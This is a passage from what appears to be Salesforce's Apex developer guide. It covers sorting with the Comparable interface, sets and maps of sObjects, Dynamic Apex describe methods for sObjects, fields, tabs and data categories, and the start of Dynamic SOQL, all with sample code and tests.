public OpportunityWrapper(Opportunity op) {
```

```apex
// Guard against wrapping a null
if(op == null) {
Exception ex = new NullPointerException();
ex.setMessage('Opportunity argument cannot be null');
throw ex;
}
oppy = op;
}
```

```apex
// Compare opportunities based on the opportunity amount.
public Integer compareTo(Object compareTo) {
```

```apex
// Cast argument to OpportunityWrapper
OpportunityWrapper compareToOppy = (OpportunityWrapper)compareTo;
```

```apex
// The return value of 0 indicates that both elements are equal.
Integer returnValue = 0;
if ((oppy.Amount == null) && (compareToOppy.oppy.Amount == null)) {
```

```apex
// both wrappers have null Amounts
returnValue = 0;
} else if ((oppy.Amount == null) && (compareToOppy.oppy.Amount != null)){
```

```apex
// nulls-first implementation
returnValue = -1;
} else if ((oppy.Amount != null) && (compareToOppy.oppy.Amount == null)){
```

```apex
// nulls-first implementation
returnValue = 1;
} else if (oppy.Amount > compareToOppy.oppy.Amount) {
```

```apex
// Set return value to a positive value.
returnValue = 1;
} else if (oppy.Amount < compareToOppy.oppy.Amount) {
```

```apex
// Set return value to a negative value.
returnValue = -1;
}
return returnValue;
}
}
```

This test sorts a list of `OpportunityWrapper` objects and verifies that the list elements are sorted by the opportunity amount.

```apex
@isTest
private class OpportunityWrapperTest {
```

```apex
static testmethod void test1() {
```

```apex
// Add the opportunity wrapper objects to a list.
OpportunityWrapper[] oppyList = new List<OpportunityWrapper>();
Date closeDate = Date.today().addDays(10);
oppyList.add( new OpportunityWrapper(new Opportunity(
Name='Edge Installation',
CloseDate=closeDate,
StageName='Prospecting',
Amount=50000)));
oppyList.add( new OpportunityWrapper(new Opportunity(
Name='United Oil Installations',
CloseDate=closeDate,
StageName='Needs Analysis',
Amount=100000)));
oppyList.add( new OpportunityWrapper(new Opportunity(
Name='Grand Hotels SLA',
CloseDate=closeDate,
StageName='Prospecting',
Amount=25000)));
```

```apex
// Sort the wrapper objects using the implementation of the
// compareTo method.
oppyList.sort();
```

```apex
// Verify the sort order
Assert.areEqual('Grand Hotels SLA', oppyList[0].oppy.Name);
Assert.areEqual(25000, oppyList[0].oppy.Amount);
Assert.areEqual('Edge Installation', oppyList[1].oppy.Name);
Assert.areEqual(50000, oppyList[1].oppy.Amount);
Assert.areEqual('United Oil Installations', oppyList[2].oppy.Name);
Assert.areEqual(100000, oppyList[2].oppy.Amount);
```

```apex
// Write the sorted list contents to the debug log.
System.debug(oppyList);
}
}
```

Apex Reference Guide : Collator Class Apex Reference Guide : Comparable Interface Apex Reference Guide : Comparator Interface

#### Expanding sObject and List Expressions

As in Java, sObject and list expressions can be expanded with method references and list expressions, respectively, to form new expressions. In the following example, a new variable containing the length of the new account name is assigned to `acctNameLength` .

```apex
Integer acctNameLength = new Account[]{new Account(Name='Acme')}[0].Name.length();
```

In the above, `new` `Account[]` generates a list. The list is populated with one element by the `new` statement `{` `new` `Account(name=` `'Acme'` `)}` . Item 0, the first item in the list, is then accessed by the next part of the string `[0]` . The name of the sObject in the list is accessed, followed by the method returning the length `name.length()` . In the following example, a name that has been shifted to lower case is returned. The SOQL statement returns a list of which the first element (at index 0) is accessed through `[0]` . Next, the Name field is accessed and converted to lowercase with this expression `.Name.toLowerCase()` .

```apex
String nameChange = [SELECT Name FROM Account][0].Name.toLowerCase();
```

#### Sets of Objects

Sets can contain sObjects among other types of elements. Sets contain unique elements. Uniqueness of sObjects is determined by comparing the objects’ fields. For example, if you try to add two accounts with the same name to a set, with no other fields set, only one sObject is added to the set.

```apex
// Create two accounts, a1 and a2
Account a1 = new account(name='MyAccount');
Account a2 = new account(name='MyAccount');
```

```apex
// Add both accounts to the new set
Set<Account> accountSet = new Set<Account>{a1, a2};
```

```apex
// Verify that the set only contains one item
System.assertEquals(accountSet.size(), 1);
```

If you add a description to one of the accounts, it is considered unique and both accounts are added to the set.

```apex
// Create two accounts, a1 and a2, and add a description to a2
Account a1 = new account(name='MyAccount');
Account a2 = new account(name='MyAccount', description='My test account');
```

```apex
// Add both accounts to the new set
Set<Account> accountSet = new Set<Account>{a1, a2};
```

```apex
// Verify that the set contains two items
System.assertEquals(accountSet.size(), 2);
```

If set elements are objects, and these objects change after being added to the collection, they won’t be found anymore when using, for example, the `contains` or `containsAll` methods, because of changed field values.

#### Maps of sObjects

Map keys and values can be of any data type, including sObject types, such as Account. Maps can hold sObjects both in their keys and values. A map key represents a unique value that maps to a map value. For example, a common key would be an ID that maps to an account (a specific sObject type). This example shows how to define a map whose keys are of type ID and whose values are of type Account.

```apex
Map<ID, Account> m = new Map<ID, Account>();
```

As with primitive types, you can populate map key-value pairs when the map is declared by using curly brace ( `{}` ) syntax. Within the curly braces, specify the key first, then specify the value for that key using `=>` . This example creates a map of integers to accounts lists and adds one entry using the account list created earlier.

```apex
Account[] accs = new Account[5]; // Account[] is synonymous with List<Account>
Map<Integer, List<Account>> m4 = new Map<Integer, List<Account>>{1 => accs};
```

Maps allow sObjects in their keys. You must use sObjects in the keys only when the sObject field values won’t change. When working with SOQL queries, maps can be populated from the results returned by the SOQL query. The map key must be declared with an ID or String data type, and the map value must be declared as an sObject data type. This example shows how to populate a new map from a query. In the example, the SOQL query returns a list of accounts with their `Id` and `Name` fields. The `new` operator uses the returned list of accounts to create a map.

```apex
// Populate map from SOQL query
Map<ID, Account> m = new Map<ID, Account>([SELECT Id, Name FROM Account LIMIT 10]);
// After populating the map, iterate through the map entries
for (ID idKey : m.keyset()) {
Account a = m.get(idKey);
System.debug(a);
}
```

One common usage of this map type is for in-memory “joins” between two tables. RecentlyViewed records for users who are members of several communities can’t be retrieved automatically into a map via Apex. This is because records of a user with different networks can result in duplicate IDs that maps don’t support. For more information, see RecentlyViewed . The `Map` class exposes various methods that you can use to work with map elements, such as adding, removing, or retrieving elements. This example uses Map methods to add new elements and retrieve existing elements from the map. This example also checks for the existence of a key and gets the set of all keys. The map in this example has one element with an integer key and an account value.

```apex
Account myAcct = new Account();
//Define a new account
Map<Integer, Account> m = new Map<Integer, Account>(); // Define a new map
m.put(1, myAcct);
// Insert a new key-value pair in the map
System.assert(!m.containsKey(3));
// Assert that the map contains a key
Account a = m.get(1);
// Retrieve a value, given a particular key
Set<Integer> s = m.keySet();
// Return a set that contains all of the keys in the
map
```

sObject Map Considerations Be cautious when using sObjects as map keys. Key matching for sObjects is based on the comparison of all sObject field values. If one or more field values change after adding an sObject to the map, attempting to retrieve this sObject from the map returns `null` . This is because the modified sObject isn’t found in the map due to different field values. This can occur if you explicitly change a field on the sObject, or if the sObject fields are implicitly changed by the system; for example, after inserting an sObject, the sObject variable has the ID field autofilled. Attempting to fetch this Object from a map to which it was added before the `insert` operation won’t yield the map entry, as shown in this example.

```apex
// Create an account and add it to the map
Account a1 = new Account(Name='A1');
Map<sObject, Integer> m = new Map<sObject, Integer>{
a1 => 1};
```

```apex
// Get a1's value from the map.
// Returns the value of 1.
System.assertEquals(1, m.get(a1));
// Id field is null.
System.assertEquals(null, a1.Id);
```

```apex
// Insert a1.
// This causes the ID field on a1 to be auto-filled
insert a1;
// Id field is now populated.
System.assertNotEquals(null, a1.Id);
```

```apex
// Get a1's value from the map again.
// Returns null because Map.get(sObject) doesn't find
// the entry based on the sObject with an auto-filled ID.
// This is because when a1 was originally added to the map
// before the insert operation, the ID of a1 was null.
System.assertEquals(null, m.get(a1));
```

Another scenario where sObject fields are autofilled is in triggers, for example, when using before and after insert triggers for an sObject. If those triggers share a static map defined in a class, and the sObjects in `Trigger.New` are added to this map in the before trigger, the sObjects in `Trigger.New` in the after trigger aren’t found in the map because the two sets of sObjects differ by the fields that are autofilled. The sObjects in `Trigger.New` in the after trigger have system fields populated after insertion, namely: ID, CreatedDate, CreatedById, LastModifiedDate, LastModifiedById, and SystemModStamp.

### Dynamic Apex

Dynamic Apex enables developers to create more flexible applications by providing them with the ability to: Access sObject and field describe information Describe information provides metadata information about sObject and field properties. For example, the describe information for an sObject includes whether that type of sObject supports operations like create or undelete, the sObject's name and label, the sObject's fields and child objects, and so on. The describe information for a field includes whether the field has a default value, whether it is a calculated field, the type of the field, and so on. Note that describe information provides information about objects in an organization, not individual records. Access Salesforce app information You can obtain describe information for standard and custom apps available in the Salesforce user interface. Each app corresponds to a collection of tabs. Describe information for an app includes the app’s label, namespace, and tabs. Describe information for a tab includes the sObject associated with the tab, tab icons and colors. Write dynamic SOQL queries , dynamic SOSL queries and dynamic DML Dynamic SOQL and SOSL queries provide the ability to execute SOQL or SOSL as a string at runtime, while dynamic DML provides the ability to create a record dynamically and then insert it into the database using DML. Using dynamic SOQL, SOSL, and DML, an application can be tailored precisely to the organization as well as the user's permissions. This can be useful for applications that are installed from AppExchange. 1. Understanding Apex Describe Information 2. Using Field Tokens 3. Understanding Describe Information Permissions 4. Describing sObjects Using Schema Method 5. Describing Tabs Using Schema Methods 6. Accessing All sObjects 7. Accessing All Data Categories Associated with an sObject 8. Dynamic SOQL 9. Dynamic SOSL 10. Dynamic DML

#### Understanding Apex Describe Information

You can describe sObjects either by using tokens or the `describeSObjects` Schema method. Apex provides two data structures and a method for sObject and field describe information: Token —a lightweight, serializable reference to an sObject or a field that is validated at compile time. This is used for token describes. The `describeSObjects` method—a method in the `Schema` class that performs describes on one or more sObject types. Describe result —an object of type `Schema.DescribeSObjectResult` that contains all the describe properties for the sObject or field. Describe result objects are not serializable, and are validated at runtime. This result object is returned when performing the describe, using either the sObject token or the `describeSObjects` method. It is easy to move from a token to its describe result, and vice versa. Both sObject and field tokens have the method `getDescribe` which returns the describe result for that token. On the describe result, the `getSObjectType` and `getSObjectField` methods return the tokens for sObject and field, respectively. Because tokens are lightweight, using them can make your code faster and more efficient. For example, use the token version of an sObject or field when you are determining the type of an sObject or field that your code needs to use. The token can be compared using the equality operator ( `==` ) to determine whether an sObject is the Account object, for example, or whether a field is the `Name` field or a custom calculated field. The following code provides a general example of how to use tokens and describe results to access information about sObject and field properties:

```apex
// Create a new account as the generic type sObject
sObject s = new Account();
```

```apex
// Verify that the generic sObject is an Account sObject
System.assert(s.getsObjectType() == Account.sObjectType);
```

```apex
// Get the sObject describe result for the Account object
Schema.DescribeSObjectResult dsr = Account.sObjectType.getDescribe();
```

```apex
// Get the field describe result for the Name field on the Account object
Schema.DescribeFieldResult dfr = Schema.sObjectType.Account.fields.Name;
```

```apex
// Verify that the field token is the token for the Name field on an Account object
System.assert(dfr.getSObjectField() == Account.Name);
```

```apex
// Get the field describe result from the token
dfr = dfr.getSObjectField().getDescribe();
```

The following algorithm shows how you can work with describe information in Apex: **1.** Generate a list or map of tokens for the sObjects in your organization (see Accessing All sObjects .) **2.** Determine the sObject you need to access. **3.** Generate the describe result for the sObject. **4.** If necessary, generate a map of field tokens for the sObject (see Accessing All Field Describe Results for an sObject .) **5.** Generate the describe result for the field the code needs to access. SObjects, such as Account and MyCustomObject__c, act as static classes with special static methods and member variables for accessing token and describe result information. You must explicitly reference an sObject and field name at compile time to gain access to the describe result. To access the token for an sObject, use one of the following methods: Access the `sObjectType` member variable on an sObject type, such as Account. Call the `getSObjectType` method on an sObject describe result, an sObject variable, a list, or a map. `Schema.SObjectType` is the data type for an sObject token. In the following example, the token for the Account sObject is returned:

```apex
Schema.sObjectType t = Account.sObjectType;
```

The following also returns a token for the Account sObject:

```apex
Account a = new Account();
Schema.sObjectType t = a.getSObjectType();
```

This example can be used to determine whether an sObject or a list of sObjects is of a particular type:

```apex
// Create a generic sObject variable s
SObject s = Database.query('SELECT Id FROM Account LIMIT 1');
```

```apex
// Verify if that sObject variable is an Account token
System.assertEquals(s.getSObjectType(), Account.sObjectType);
```

```apex
// Create a list of generic sObjects
List<sObject> sobjList = new Account[]{};
```

```apex
// Verify if the list of sObjects contains Account tokens
System.assertEquals(sobjList.getSObjectType(), Account.sObjectType);
```

Some standard sObjects have a field called `sObjectType` , for example, AssignmentRule, QueueSObject, and RecordType. For these types of sObjects, always use the `getSObjectType` method for retrieving the token. If you use the property, for example, `RecordType.sObjectType` , the field is returned. To access the describe result for an sObject, use one of the following methods: Call the `getDescribe` method on an sObject token. Use the Schema `sObjectType` static variable with the name of the sObject. For example, `Schema.sObjectType.Lead` . `Schema.DescribeSObjectResult` is the data type for an sObject describe result. The following example uses the `getDescribe` method on an sObject token:

```apex
Schema.DescribeSObjectResult dsr = Account.sObjectType.getDescribe();
```

The following example uses the Schema `sObjectType` static member variable:

```apex
Schema.DescribeSObjectResult dsr = Schema.SObjectType.Account;
```

For more information about the methods available with the sObject describe result, see DescribeSObjectResultClass . DescribeSObjectResult.fields() DescribeSObjectResult.fieldsets()

#### Using Field Tokens

To access the token for a field, use one of the following methods: Access the static member variable name of an sObject static type, for example, `Account.Name` . Call the `getSObjectField` method on a field describe result. The field token uses the data type `Schema.SObjectField` . In the following example, the field token is returned for the Account object's `Description` field:

```apex
Schema.SObjectField fieldToken = Account.Description;
```

In the following example, the field token is returned from the field describe result:

```apex
// Get the describe result for the Name field on the Account object
Schema.DescribeFieldResult dfr = Schema.sObjectType.Account.fields.Name;
```

```apex
// Verify that the field token is the token for the Name field on an Account object
System.assert(dfr.getSObjectField() == Account.Name);
```

```apex
// Get the describe result from the token
dfr = dfr.getSObjectField().getDescribe();
```

Field tokens aren't available for person accounts. If you access `Schema.Account.` `fieldname` , you get an exception error. Instead, specify the field name as a string. To access the describe result for a field, use one of the following methods: Call the `getDescribe` method on a field token. Access the `fields` member variable of an sObject token with a field member variable (such as `Name` , `BillingCity` , and so on.) The field describe result uses the data type `Schema.DescribeFieldResult` . The following example uses the `getDescribe` method:

```apex
Schema.DescribeFieldResult dfr = Account.Description.getDescribe();
```

This example uses the `fields` member variable method:

```apex
Schema.DescribeFieldResult dfr = Schema.SObjectType.Account.fields.Name;
```

In the example above, the system uses special parsing to validate that the final member variable ( `Name` ) is valid for the specified sObject at compile time. When the parser finds the `fields` member variable, it looks backwards to find the name of the sObject ( `Account` ). It validates that the field name following the `fields` member variable is legitimate. The `fields` member variable only works when used in this manner. Don’t use the `fields` member variable without also using either a field member variable name or the `getMap` method. For more information on `getMap` , see the next section. For more information about the methods available with a field describe result, see DescribeFieldResultClass . Use the field describe result's `getMap` method to return a map that represents the relationship between all the field names (keys) and the field tokens (values) for an sObject. The following example generates a map that can be used to access a field by name:

```apex
Map<String, Schema.SObjectField> fieldMap = Schema.SObjectType.Account.fields.getMap();
```

The value type of this map is not a field describe result. Using the describe results would take too many system resources. Instead, it is a map of tokens that you can use to find the appropriate field. After you determine the field, generate the describe result for it. The map has the following characteristics: It is dynamic, that is, it is generated at runtime on the fields for that sObject. All field names are case insensitive. The keys use namespaces as required. The keys reflect whether the field is a custom object. Note the following when describing fields. A field describe that’s executed from within an installed managed package returns Chatter fields even if Chatter is not enabled in the installing organization. This is not true if the field describe is executed from a class that’s not within an installed managed package. When you describe sObjects and their fields from within an Apex class, custom fields of new field types are returned regardless of the API version that the class is saved in. If a field type, such as the geolocation field type, is available only in a recent API version, components of a geolocation field are returned even if the class is saved in an earlier API version. In API version 34.0 and later, Schema.DescribeSObjectResult on a custom SObjectType includes map keys prefixed with the namespace, even if the namespace is that of currently executing code. If you work with multiple namespaces and generate runtime describe data, make sure that your code accesses keys correctly using the namespace prefix. DescribeSObjectResult.fields() DescribeSObjectResult.fieldsets()

#### Understanding Describe Information Permissions

Apex classes run in user mode by default, which means that user permissions on objects and field-level security are respected. A user cannot run code that tries to access fields or objects that are hidden from the user. User permissions also matter when you execute describe calls in an anonymous block.. As a result, not all sObjects and fields can be looked up if access is restricted for the running user. For example, if you describe account fields in an anonymous block and you don’t have access to all fields, not all fields are returned. Anonymous Blocks Managed Package Types

#### Describing sObjects Using Schema Method

As an alternative to using tokens, you can describe sObjects by calling the `describeSObjects` Schema method and passing one or more sObject type names for the sObjects you want to describe. This example gets describe metadata information for two sObject types—The Account standard object and the Merchandise__c custom object. After obtaining the describe result for each sObject, this example writes the returned information to the debug output, such as the sObject label, number of fields, whether it is a custom object or not, and the number of child relationships.

```apex
// sObject types to describe
String[] types = new String[]{'Account','Merchandise__c'};
```

```apex
// Make the describe call
Schema.DescribeSobjectResult[] results = Schema.describeSObjects(types);
```

```apex
System.debug('Got describe information for ' + results.size() + ' sObjects.');
```

```apex
// For each returned result, get some info
for(Schema.DescribeSobjectResult res : results) {
System.debug('sObject Label: ' + res.getLabel());
System.debug('Number of fields: ' + res.fields.getMap().size());
System.debug(res.isCustom() ? 'This is a custom object.' : 'This is a standard object.');
```

```apex
// Get child relationships
Schema.ChildRelationship[] rels = res.getChildRelationships();
if (rels.size() > 0) {
System.debug(res.getName() + ' has ' + rels.size() + ' child relationships.');
}
}
```

DescribeSObjectResult.fields() DescribeSObjectResult.fieldsets()

#### Describing Tabs Using Schema Methods

You can get metadata information about the apps and their tabs available in the Salesforce user interface by executing a describe call in Apex. Also, you can get more detailed information about each tab. Use the `describeTabs` Schema method and the `getTabs` method in `Schema.DescribeTabResult` , respectively. This example shows how to get the tab sets for each app. The example then obtains tab describe metadata information for the Sales app. For each tab, metadata information includes the icon URL, whether the tab is custom or not, and colors among others. The tab describe information is written to the debug output.

```apex
// Get tab set describes for each app
List<Schema.DescribeTabSetResult> tabSetDesc = Schema.describeTabs();
```

```apex
// Iterate through each tab set describe for each app and display the info
for(DescribeTabSetResult tsr : tabSetDesc) {
```

```apex
String appLabel = tsr.getLabel();
System.debug('Label: ' + appLabel);
System.debug('Logo URL: ' + tsr.getLogoUrl());
System.debug('isSelected: ' + tsr.isSelected());
String ns = tsr.getNamespace();
```

```apex
if (ns == '') {
System.debug('The ' + appLabel + ' app has no namespace defined.');
}
else {
System.debug('Namespace: ' + ns);
}
```

```apex
// Display tab info for the Sales app
if (appLabel == 'Sales') {
List<Schema.DescribeTabResult> tabDesc = tsr.getTabs();
System.debug('-- Tab information for the Sales app --');
for(Schema.DescribeTabResult tr : tabDesc) {
System.debug('getLabel: ' + tr.getLabel());
System.debug('getColors: ' + tr.getColors());
System.debug('getIconUrl: ' + tr.getIconUrl());
System.debug('getIcons: ' + tr.getIcons());
System.debug('getMiniIconUrl: ' + tr.getMiniIconUrl());
System.debug('getSobjectName: ' + tr.getSobjectName());
System.debug('getUrl: ' + tr.getUrl());
System.debug('isCustom: ' + tr.isCustom());
}
}
}
```

```apex
// Example debug statement output
// DEBUG|Label: Sales
// DEBUG|Logo URL:
https://MyDomainName.my.salesforce.com/img/seasonLogos/2014_winter_aloha.png
// DEBUG|isSelected: true
// DEBUG|The Sales app has no namespace defined.// DEBUG|-- Tab information for the Sales
app --
// (This is an example debug output for the Accounts tab.)
// DEBUG|getLabel: Accounts
// DEBUG|getColors:
(Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme4;],
//
Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme3;],
```

```apex
//
Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme2;])
// DEBUG|getIconUrl: https://MyDomainName.my.salesforce.com/img/icon/accounts32.png
// DEBUG|getIcons:
(Schema.DescribeIconResult[getContentType=image/png;getHeight=32;getTheme=theme3;
//
getUrl=https://MyDomainName.my.salesforce.com/img/icon/accounts32.png;getWidth=32;],
//
Schema.DescribeIconResult[getContentType=image/png;getHeight=16;getTheme=theme3;
//
getUrl=https://MyDomainName.my.salesforce.com/img/icon/accounts16.png;getWidth=16;])
// DEBUG|getMiniIconUrl: https://MyDomainName.my.salesforce.com/img/icon/accounts16.png
// DEBUG|getSobjectName: Account
// DEBUG|getUrl: https://MyDomainName.my.salesforce.com/001/o
// DEBUG|isCustom: false
```

#### Accessing All sObjects

Use the Schema `getGlobalDescribe` method to return a map that represents the relationship between all sObject names (keys) to sObject tokens (values). For example:

```apex
Map<String, Schema.SObjectType> gd = Schema.getGlobalDescribe();
```

The map has the following characteristics: It is dynamic, that is, it is generated at runtime on the sObjects currently available for the organization, based on permissions. The sObject names are case insensitive. The keys are prefixed with the namespace, if any. * The keys reflect whether the sObject is a custom object. * Starting with Apex saved using Salesforce API version 28.0, the keys in the map that `getGlobalDescribe` returns are always prefixed with the namespace, if any, of the code in which it is running. For example, if the code block that makes the `getGlobalDescribe` call is in namespace NS1, and a custom object named MyObject__c is in the same namespace, the key returned is `NS1__MyObject__c` . For Apex saved using earlier API versions, the key contains the namespace only if the namespace of the code block and the namespace of the sObject are different. For example, if the code block that generates the map is in namespace N1, and an sObject is also in N1, the key in the map is represented as `MyObject__c` . However, if the code block is in namespace N1, and the sObject is in namespace N2, the key is `N2__MyObject__c` . Standard sObjects have no namespace prefix. If the `getGlobalDescribe` method is called from an installed managed package, it returns sObject names and tokens for Chatter sObjects, such as NewsFeed and UserProfileFeed, even if Chatter is not enabled in the installing organization. This is not true if the `getGlobalDescribe` method is called from a class not within an installed managed package.

#### Accessing All Data Categories Associated with an sObject

Use the `describeDataCategoryGroups` and `describeDataCategoryGroupStructures` methods to return the categories associated with a specific object: **1.** Return all the category groups associated with the objects of your choice (see `describeDataCategoryGroups(sObjectNames)` ). **2.** From the returned map, get the category group name and sObject name you want to further interrogate (see DescribeDataCategoryGroupResult Class ). **3.** Specify the category group and associated object, then retrieve the categories available to this object (see `describeDataCategoryGroupStructures` ). The `describeDataCategoryGroupStructures` method returns the categories available for the object in the category group you specified. For additional information about data categories, see “Work with Data Categories” in the Salesforce online help. In the following example, the `describeDataCategoryGroupSample` method returns all the category groups associated with the Article and Question objects. The `describeDataCategoryGroupStructures` method returns all the categories available for articles and questions in the Regions category group. For additional information about articles and questions, see “Work with Articles and Translations” in the Salesforce online help. To use the following example, you must: Enable Salesforce Knowledge. Enable the answers feature. Create a data category group called Regions. Assign Regions as the data category group to be used by Answers. Make sure the Regions data category group is assigned to Salesforce Knowledge. For more information on creating data category groups, see “Create and Modify Category Groups” in the Salesforce online help. For more information on answers, see “Answers Overview” in the Salesforce online help.

```apex
public class DescribeDataCategoryGroupSample {
```

```apex
public static List<DescribeDataCategoryGroupResult> describeDataCategoryGroupSample(){
```

```apex
List<DescribeDataCategoryGroupResult> describeCategoryResult;
try {
```

```apex
//Creating the list of sobjects to use for the describe
//call
List<String> objType = new List<String>();
```

```apex
objType.add('KnowledgeArticleVersion');
objType.add('Question');
```

```apex
//Describe Call
describeCategoryResult = Schema.describeDataCategoryGroups(objType);
```

```apex
//Using the results and retrieving the information
for(DescribeDataCategoryGroupResult singleResult : describeCategoryResult){
```

```apex
//Getting the name of the category
singleResult.getName();
```

```apex
//Getting the name of label
singleResult.getLabel();
```

```apex
//Getting description
singleResult.getDescription();
```

```apex
//Getting the sobject
singleResult.getSobject();
}
} catch(Exception e){
}
```

```apex
return describeCategoryResult;
}
}
```

```apex
public class DescribeDataCategoryGroupStructures {
```

```apex
public static List<DescribeDataCategoryGroupStructureResult>
getDescribeDataCategoryGroupStructureResults(){
List<DescribeDataCategoryGroupResult> describeCategoryResult;
List<DescribeDataCategoryGroupStructureResult> describeCategoryStructureResult;
try {
```

```apex
//Making the call to the describeDataCategoryGroups to
//get the list of category groups associated
List<String> objType = new List<String>();
objType.add('KnowledgeArticleVersion');
objType.add('Question');
```

```apex
describeCategoryResult = Schema.describeDataCategoryGroups(objType);
```

```apex
//Creating a list of pair objects to use as a parameter
//for the describe call
List<DataCategoryGroupSobjectTypePair> pairs =
```

```apex
new List<DataCategoryGroupSobjectTypePair>();
```

```apex
//Looping throught the first describe result to create
//the list of pairs for the second describe call
for(DescribeDataCategoryGroupResult singleResult :
describeCategoryResult){
DataCategoryGroupSobjectTypePair p =
```

```apex
new DataCategoryGroupSobjectTypePair();
p.setSobject(singleResult.getSobject());
p.setDataCategoryGroupName(singleResult.getName());
pairs.add(p);
}
```

```apex
//describeDataCategoryGroupStructures()
describeCategoryStructureResult =
Schema.describeDataCategoryGroupStructures(pairs, false);
```

```apex
//Getting data from the result
for(DescribeDataCategoryGroupStructureResult singleResult :
describeCategoryStructureResult){
```

```apex
//Get name of the associated Sobject
singleResult.getSobject();
```

```apex
//Get the name of the data category group
singleResult.getName();
```

```apex
//Get the name of the data category group
singleResult.getLabel();
```

```apex
//Get the description of the data category group
singleResult.getDescription();
```

```apex
//Get the top level categories
DataCategory [] toplevelCategories =
singleResult.getTopCategories();
```

```apex
//Recursively get all the categories
List<DataCategory> allCategories =
getAllCategories(toplevelCategories);
```

```apex
for(DataCategory category : allCategories) {
```

```apex
//Get the name of the category
category.getName();
```

```apex
//Get the label of the category
category.getLabel();
```

```apex
//Get the list of sub categories in the category
DataCategory [] childCategories =
```

```apex
category.getChildCategories();
}
}
} catch (Exception e){
}
return describeCategoryStructureResult;
}
```

```apex
private static DataCategory[] getAllCategories(DataCategory [] categories){
```

```apex
if(categories.isEmpty()){
```

```apex
return new DataCategory[]{};
} else {
DataCategory [] categoriesClone = categories.clone();
DataCategory category = categoriesClone[0];
DataCategory[] allCategories = new DataCategory[]{category};
categoriesClone.remove(0);
categoriesClone.addAll(category.getChildCategories());
allCategories.addAll(getAllCategories(categoriesClone));
return allCategories;
}
}
}
```

The following example tests the `describeDataCategoryGroupSample` method shown earlier. It ensures that the returned category group and associated objects are correct.

```apex
@isTest
private class DescribeDataCategoryGroupSampleTest {
```

```apex
public static testMethod void describeDataCategoryGroupSampleTest(){
List<DescribeDataCategoryGroupResult>describeResult =
DescribeDataCategoryGroupSample.describeDataCategoryGroupSample();
```

```apex
//Assuming that you have KnowledgeArticleVersion and Questions
//associated with only one category group 'Regions'.
System.assert(describeResult.size() == 2,
```

```apex
'The results should only contain two results: ' + describeResult.size());
```

```apex
for(DescribeDataCategoryGroupResult result : describeResult) {
```

```apex
//Storing the results
String name = result.getName();
String label = result.getLabel();
String description = result.getDescription();
String objectNames = result.getSobject();
```

```apex
//asserting the values to make sure
System.assert(name == 'Regions',
'Incorrect name was returned: ' + name);
System.assert(label == 'Regions of the World',
'Incorrect label was returned: ' + label);
System.assert(description == 'This is the category group for all the regions',
'Incorrect description was returned: ' + description);
```

```apex
System.assert(objectNames.contains('KnowledgeArticleVersion')
|| objectNames.contains('Question'),
'Incorrect sObject was returned: ' + objectNames);
}
}
}
```

This example tests the `describeDataCategoryGroupStructures` method. It ensures that the returned category group, categories and associated objects are correct.

```apex
@isTest
private class DescribeDataCategoryGroupStructuresTest {
```

```apex
public static testMethod void getDescribeDataCategoryGroupStructureResultsTest(){
List<Schema.DescribeDataCategoryGroupStructureResult> describeResult =
DescribeDataCategoryGroupStructures.getDescribeDataCategoryGroupStructureResults();
```

```apex
System.assert(describeResult.size() == 2,
```

```apex
'The results should only contain 2 results: ' + describeResult.size());
```

```apex
//Creating category info
CategoryInfo world = new CategoryInfo('World', 'World');
CategoryInfo asia = new CategoryInfo('Asia', 'Asia');
CategoryInfo northAmerica = new CategoryInfo('NorthAmerica',
```

```apex
'North America');
CategoryInfo southAmerica = new CategoryInfo('SouthAmerica',
```

```apex
'South America');
CategoryInfo europe = new CategoryInfo('Europe', 'Europe');
```

```apex
List<CategoryInfo> info = new CategoryInfo[] {
asia, northAmerica, southAmerica, europe
};
```

```apex
for (Schema.DescribeDataCategoryGroupStructureResult result : describeResult) {
```

```apex
String name = result.getName();
String label = result.getLabel();
String description = result.getDescription();
String objectNames = result.getSobject();
```

```apex
//asserting the values to make sure
System.assert(name == 'Regions',
'Incorrect name was returned: ' + name);
System.assert(label == 'Regions of the World',
'Incorrect label was returned: ' + label);
System.assert(description == 'This is the category group for all the regions',
'Incorrect description was returned: ' + description);
System.assert(objectNames.contains('KnowledgeArticleVersion')
|| objectNames.contains('Question'),
```

```apex
'Incorrect sObject was returned: ' + objectNames);
```

```apex
DataCategory [] topLevelCategories = result.getTopCategories();
System.assert(topLevelCategories.size() == 1,
'Incorrect number of top level categories returned: ' + topLevelCategories.size());
```

```apex
System.assert(topLevelCategories[0].getLabel() == world.getLabel() &&
```

```apex
topLevelCategories[0].getName() == world.getName());
```

```apex
//checking if the correct children are returned
DataCategory [] children = topLevelCategories[0].getChildCategories();
System.assert(children.size() == 4,
'Incorrect number of children returned: ' + children.size());
for(Integer i=0; i < children.size(); i++){
System.assert(children[i].getLabel() == info[i].getLabel() &&
children[i].getName() == info[i].getName());
}
}
```

```apex
}
```

```apex
private class CategoryInfo {
```

```apex
private final String name;
private final String label;
```

```apex
private CategoryInfo(String n, String l){
```

```apex
this.name = n;
this.label = l;
}
```

```apex
public String getName(){
```

```apex
return this.name;
}
```

```apex
public String getLabel(){
```

```apex
return this.label;
}
}
}
```

#### Dynamic SOQL

Dynamic SOQL refers to the creation of a SOQL string at run time with Apex code. Dynamic SOQL enables you to create more flexible applications. For example, you can create a search based on input from an end user or update records with varying field names. To create a dynamic SOQL query at run time, use the `Database.query` or `Database.queryWithBinds` methods, in one of the following ways. Return a single sObject when the query returns a single record:

```apex
sObject s = Database.query(string);
```

Return a list of sObjects when the query returns more than a single record:

```apex
List<sObject> sobjList = Database.query(string);
```

Return a list of sObjects using a map of bind variables:

```apex
List<sObject> sobjList = Database.queryWithBinds(string, bindVariablesMap, accessLevel);
```

The `Database.query` and `Database.queryWithBinds` methods can be used wherever an inline SOQL query can be used, such as in regular assignment statements and `for` loops. The results are processed in much the same way as static SOQL queries are processed. In API version 55.0 and later, you can use the `accessLevel` parameter to run the query operation in user or system mode. The `accessLevel` parameter specifies whether the method runs in system mode ( `AccessLevel.SYSTEM_MODE` ) or user mode ( `AccessLevel.USER_MODE` ). In system mode, the object and field-level permissions of the current user are ignored, and the record sharing rules are controlled by the class sharing keywords . In user mode, the object permissions, field-level security, and sharing rules of the current user are enforced. User mode is the default. Dynamic SOQL results can be specified as concrete sObjects, such as Account or MyCustomObject__c, or as the generic sObject data type. At run time, the system validates that the type of the query matches the declared type of the variable. If the query doesn’t return the correct sObject type, a run-time error is thrown. Therefore, you don’t have to cast from a generic sObject to a concrete sObject. Dynamic SOQL queries have the same governor limits as static queries. For more information on governor 